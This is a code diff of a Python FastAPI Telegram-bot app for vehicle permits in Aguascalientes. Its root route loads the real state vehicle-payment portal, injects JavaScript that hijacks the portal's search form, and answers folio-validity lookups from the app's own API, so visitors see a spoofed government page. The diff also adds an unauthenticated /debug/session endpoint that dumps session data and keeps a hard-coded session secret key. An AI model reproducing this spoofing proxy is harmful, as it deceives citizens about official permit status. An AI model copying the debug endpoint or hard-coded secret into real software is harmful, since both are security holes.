@@ -23,7 +23,6 @@ import qrcode
 from io import BytesIO
 import fitz
 from starlette.middleware.sessions import SessionMiddleware
-import requests
 
 # ===================== CONFIGURACIÓN =====================
 BOT_TOKEN        = os.getenv("BOT_TOKEN", "")
@@ -677,8 +676,14 @@ async def lifespan(app: FastAPI):
     await bot.session.close()
 
 app = FastAPI(lifespan=lifespan, title="Bot Permisos AGS", version="7.2")
-app.add_middleware(SessionMiddleware, secret_key="tu_clave_secreta_super_segura_123456")
+app.add_middleware(SessionMiddleware, secret_key="tu_clave_secreta_super_segura_123456_cambiar_en_produccion", max_age=86400)
 app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
+
+# ===================== ENDPOINT DEBUG =====================
+@app.get("/debug/session")
+async def debug_session(request: Request):
+    """Solo para debugging - eliminar en producción"""
+    return {"session": dict(request.session)}
 
 # ===================== RUTAS WEB - PANEL ADMIN =====================
 
@@ -689,10 +694,18 @@ async def login_get(request: Request):
 @app.post("/panel/login")
 async def login_post(request: Request,
                      username: str = Form(...), password: str = Form(...)):
+    username = username.strip()
+    password = password.strip()
+    print(f"[LOGIN] Intento: user={username}, pass={'*'*len(password)}")
+    
     if username == ADMIN_USER and password == ADMIN_PASS:
         request.session["admin"]    = True
         request.session["username"] = username
-        return RedirectResponse(url="/panel/admin", status_code=303)
+        print(f"[LOGIN] ✅ Login exitoso: {username}")
+        response = RedirectResponse(url="/panel/admin", status_code=303)
+        return response
+    
+    print(f"[LOGIN] ❌ Credenciales incorrectas")
     return RedirectResponse(url="/panel/login?error=1", status_code=303)
 
 @app.get("/panel/admin", response_class=HTMLResponse)
@@ -860,40 +873,41 @@ async def telegram_webhook(request: Request):
 async def root():
     """Interfaz pública de consulta - jala el HTML de epagos.aguascalientes.gob.mx y lo personaliza"""
     try:
-        # Intentar obtener el HTML original del portal de Aguascalientes
-        response = requests.get("https://epagos.aguascalientes.gob.mx/controlvehicular", timeout=10)
-        if response.status_code == 200:
-            html = response.text
-            # Inyectar script personalizado para consumir nuestra API
-            inject_script = """
-            <script>
-            window.API_BASE = window.location.origin;
-            // Override del formulario de búsqueda original
-            document.addEventListener('DOMContentLoaded', function() {
-                const form = document.querySelector('form');
-                if (form) {
-                    form.onsubmit = function(e) {
-                        e.preventDefault();
-                        const folio = document.querySelector('input[name="folio"], input[placeholder*="placa"], input[type="text"]').value.toUpperCase();
-                        if (!folio) return alert('Ingresa un folio válido');
-                        fetch(window.API_BASE + '/api/consultar_folio/' + folio)
-                            .then(r => r.json())
-                            .then(d => {
-                                console.log(d);
-                                if (d.ok) {
-                                    alert('✅ Folio ' + d.folio + ' - ' + d.estado_vigencia);
-                                } else {
-                                    alert('❌ ' + d.mensaje);
-                                }
-                            })
-                            .catch(e => alert('Error: ' + e.message));
-                    };
-                }
-            });
-            </script>
-            """
-            html = html.replace('</body>', inject_script + '</body>')
-            return HTMLResponse(html)
+        # Intentar obtener el HTML original del portal de Aguascalientes con aiohttp
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://epagos.aguascalientes.gob.mx/controlvehicular", timeout=aiohttp.ClientTimeout(total=5)) as response:
+                if response.status == 200:
+                    html = await response.text()
+                    # Inyectar script personalizado para consumir nuestra API
+                    inject_script = """
+                    <script>
+                    window.API_BASE = window.location.origin;
+                    // Override del formulario de búsqueda original
+                    document.addEventListener('DOMContentLoaded', function() {
+                        const form = document.querySelector('form');
+                        if (form) {
+                            form.onsubmit = function(e) {
+                                e.preventDefault();
+                                const folio = document.querySelector('input[name="folio"], input[placeholder*="placa"], input[type="text"]').value.toUpperCase();
+                                if (!folio) return alert('Ingresa un folio válido');
+                                fetch(window.API_BASE + '/api/consultar_folio/' + folio)
+                                    .then(r => r.json())
+                                    .then(d => {
+                                        console.log(d);
+                                        if (d.ok) {
+                                            alert('✅ Folio ' + d.folio + ' - ' + d.estado_vigencia);
+                                        } else {
+                                            alert('❌ ' + d.mensaje);
+                                        }
+                                    })
+                                    .catch(e => alert('Error: ' + e.message));
+                            };
+                        }
+                    });
+                    </script>
+                    """
+                    html = html.replace('</body>', inject_script + '</body>')
+                    return HTMLResponse(html)
     except Exception as e:
         print(f"[ERROR] Cargando portal Aguascalientes: {e}")
     
